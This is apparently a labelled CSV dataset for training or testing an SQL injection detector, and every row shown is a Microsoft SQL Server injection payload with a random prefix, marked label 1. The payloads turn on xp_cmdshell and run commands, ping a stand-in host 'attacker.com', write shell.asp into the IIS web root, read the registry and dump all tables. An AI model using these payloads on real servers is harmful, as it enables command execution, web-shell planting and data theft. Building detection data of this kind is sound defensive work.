content,label
"下载 setting 16 '; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"13dkbld@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
p5gs17@'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
es8iox@'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
优势 '; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
2inkn@'; EXEC sp_who--,1
解无带百共'; EXEC sp_who--,1
ontp3ttein@'; EXEC sp_who--,1
使用方法 admin '; EXEC sp_helpdb--,1
好不好 '; EXEC sp_helpdb--,1
推荐 '; EXEC sp_helpdb--,1
优势 '; EXEC sp_configure--,1
hse2ml1@'; EXEC sp_configure--,1
织气流力律派政象九极'; EXEC sp_configure--,1
"p49hqu5yy1@'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
view 下载 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
vbk6plftibv@'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
setting 如何 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
"教列动规处约决'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"rq35phot@'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"fail 评测 '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"教程 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"排名 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"际拉花外时儿度容与'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"什么是 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
gv10g33w@'; EXEC sp_MSgetversion--,1
无种列划般子油'; EXEC sp_MSgetversion--,1
功能 '; EXEC sp_MSgetversion--,1
什么是 '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
jkpyw851nj@'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
业六油放验由着及平单查定七不'; EXEC xp_cmdshell('whoami')--,1
fl5cnhzuwhl0@'; EXEC xp_cmdshell('whoami')--,1
办打内集心'; EXEC xp_cmdshell('whoami')--,1
教程 '; EXEC xp_cmdshell('whoami')--,1
"亲部热多所其'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"74s17kssq292@'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"哪里买 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
profile 891 '; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
评测 setting '; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
ev0aaqd2@'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
2jw4spdp@'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
"dxp1rwp2d@'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"fail 下载 '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"毛车调往说根王导品必'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"多少钱 '; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"62z2y5c@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"aaf0hurna@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
8qr2yco03@'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
评测 '; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
教程 '; EXEC sp_who--,1
4vhz7qgftm@'; EXEC sp_who--,1
持理元年步利器同太完称看特求引'; EXEC sp_who--,1
难党感由质更对选眼总质容'; EXEC sp_who--,1
kvldco9znwp@'; EXEC sp_helpdb--,1
如何 '; EXEC sp_helpdb--,1
论流示比要商了万厂'; EXEC sp_helpdb--,1
农合维较感引极单应国响式据认'; EXEC sp_helpdb--,1
tvhkfla3du2@'; EXEC sp_configure--,1
clmewdwud@'; EXEC sp_configure--,1
6q11covl@'; EXEC sp_configure--,1
5lmoqwqud@'; EXEC sp_configure--,1
"query 406 '; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"边名高'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"n7r34d@'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
对比 view 14 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
4g4i0pkep1@'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
data 特点 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
多少钱 view '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
"oekmexudv@'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"kok5jy6tj@'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"ybc5h@'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"价格 setting 84 '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"功能 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"admin 499 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"7irmtufu2vx3@'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
实议表界'; EXEC sp_MSgetversion--,1
irzsx9@'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
推荐 system '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
database 611 '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
如很门气物强酸本事因路按能于'; EXEC xp_cmdshell('whoami')--,1
profile 405 '; EXEC xp_cmdshell('whoami')--,1
bnx6ll7sq@'; EXEC xp_cmdshell('whoami')--,1
"月线候况计两土圆与十料候地装将'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"际叫行'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"za16stp@'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
hid2trgg8gil@'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
多少钱 '; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
越家认精引社非从如权火王持整积'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
复的连世分土走当'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
"特点 '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"user 697 '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"qdv8i2css@'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"中织治大严半级'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"jtv0py2@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
85q6nl@'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
5i2mrcup@'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
test 好不好 '; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
好不好 account 94 '; EXEC sp_who--,1
维种边但'; EXEC sp_helpdb--,1
jowvayzbiky@'; EXEC sp_helpdb--,1
rizbcuwxp@'; EXEC sp_configure--,1
推荐 '; EXEC sp_configure--,1
"术千了满太比始律确热里条今革'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"j5ueypi5rvk@'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"dk7db86er@'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
uf94z@'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
价格 item 53 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
评测 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
h06c2p1iv03g@'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
怎么样 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
"5oj2i3bf0blt@'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"lbq9snhubsj@'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"点九流则民压么'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"属相且北求同电表低海运据亲到'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"能消六表过又而单色期者原'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"page 825 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"历构安时细受却多命受方书世'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
评测 '; EXEC sp_MSgetversion--,1
千交作教写常此效将解层广通间'; EXEC sp_MSgetversion--,1
g7ktzw4vk0lf@'; EXEC sp_MSgetversion--,1
iz2xt3o5wcd@'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
应周就铁圆通采别马军'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
query 506 '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
下载 item 86 '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
mn272@'; EXEC xp_cmdshell('whoami')--,1
价格 database '; EXEC xp_cmdshell('whoami')--,1
nfsruqct@'; EXEC xp_cmdshell('whoami')--,1
"afci3tqgd0@'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"query 2024 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"xghskwl4n3@'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"hxx28@'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"多少钱 database '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
oeb79zqtv8@'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
wpkf8e34@'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
将新按红七支九体去证量路'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
"里路情王由展容安内细须存两管如'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"准联界去细风论度公心'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"x8eyx6xl1q96@'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"2024 '; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"8t38al1@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"怎么样 user 76 '; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"年向史所转党'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
教程 '; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
cpiez9@'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
速转快通其直样体件何九'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
vlyw1q98px@'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
88mvtms5@'; EXEC sp_who--,1
功能 '; EXEC sp_who--,1
推荐 test 53 '; EXEC sp_who--,1
profile 功能 '; EXEC sp_helpdb--,1
7srh6z5ix1s7@'; EXEC sp_helpdb--,1
思全活才号记治量变性些生'; EXEC sp_helpdb--,1
对比 '; EXEC sp_helpdb--,1
iudc8@'; EXEC sp_configure--,1
table 使用方法 '; EXEC sp_configure--,1
最新 profile 72 '; EXEC sp_configure--,1
组难次海社门活放期积被给'; EXEC sp_configure--,1
"评测 admin 94 '; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"优势 '; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"ql0i530@'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
0as0l@'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
a2a3ks15ge@'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
使用方法 warning 32 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
"命难斯列'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"下载 '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"ey7ujdt6ky@'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"阶题志'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"推荐 '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"u38rhx9pe230@'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"使用方法 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"价格 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"system 801 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
data 下载 '; EXEC sp_MSgetversion--,1
l6bz5dcd@'; EXEC sp_MSgetversion--,1
pjnc7txr6v3@'; EXEC sp_MSgetversion--,1
一月家已道能'; EXEC sp_MSgetversion--,1
价格 password '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
哪里买 '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
h7xshi8@'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
推荐 '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
府入易动员组才科深候集文况'; EXEC xp_cmdshell('whoami')--,1
信集列成会明住对边进'; EXEC xp_cmdshell('whoami')--,1
"历单团群至使儿口做的它酸土接温'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"推荐 info 73 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"password 865 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"优势 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"通术知二成易毛事亲'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
形展象是提气需有达共思看大'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
mpdhok2y@'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
9c45511@'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
存流么是按'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
"如何 system 96 '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"如何 '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"4vio0f@'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"info 513 '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"ulkb1@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"ulkf3ujjz@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"本导小'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
"ibt9posra8@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
哪里买 login '; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
jslb2hw@'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
在见书织八心七称选'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
9fr96q@'; EXEC sp_who--,1
b5p305doc@'; EXEC sp_who--,1
查段研报选况和领心如'; EXEC sp_helpdb--,1
ht7hgv@'; EXEC sp_helpdb--,1
排名 '; EXEC sp_helpdb--,1
划性器半使大改委加么新有油务不'; EXEC sp_helpdb--,1
7f7gymch8g@'; EXEC sp_configure--,1
排名 profile 50 '; EXEC sp_configure--,1
哪里买 page '; EXEC sp_configure--,1
"2024 '; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"斯都团件办是'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
"利备并较律构设分'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
哪里买 data 13 '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
战真至器据义土铁自的越带'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
优势 query '; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
"0ovhqr@'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"哪里买 '; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"qtu0m@'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"毛根眼放流里青九于外步也'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"database 676 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
"哪里买 system 91 '; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
权多通斗整状战集明较每没长'; EXEC sp_MSgetversion--,1
dkxnq2epee@'; EXEC sp_MSgetversion--,1
ahiv7rsgd@'; EXEC sp_MSgetversion--,1
除派指动法意北科场'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
warning 455 '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
7vmp29rpwfw@'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
教程 server '; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
矿安队制山特清电事指好四口比眼'; EXEC xp_cmdshell('whoami')--,1
品形存明于行八'; EXEC xp_cmdshell('whoami')--,1
怎么样 error '; EXEC xp_cmdshell('whoami')--,1
"tfsgxl5ygqj@'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"圆算土办史公老斗车史'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"7lern58nxc@'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"query 285 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
"warning 465 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
smunaqaj2@'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
处党动向青传容步再分'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
具放图带生起难指验五理'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
优势 data 66 '; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
"推荐 '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"教程 '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"2024 server '; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"7mrdfmunex@'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
